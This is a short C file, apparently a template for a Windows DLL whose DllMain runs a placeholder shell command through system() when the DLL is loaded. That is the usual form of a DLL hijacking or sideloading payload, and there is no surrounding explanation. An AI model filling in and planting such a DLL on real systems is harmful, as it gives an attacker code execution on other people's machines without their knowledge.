#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE a, DWORD  b, LPVOID c)
{
    system("<command>");
    return TRUE;
}

